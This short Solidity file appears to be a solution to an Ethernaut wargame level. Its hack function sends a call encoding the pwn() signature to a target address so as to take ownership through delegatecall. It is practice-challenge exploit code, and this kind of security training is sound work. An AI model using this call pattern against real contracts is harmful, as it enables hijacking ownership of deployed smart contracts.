// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Ethernaut06 {
    constructor() {}

    function hack(address _address) public {
        (bool success, ) = _address.call(abi.encodeWithSignature("pwn()"));
    }
}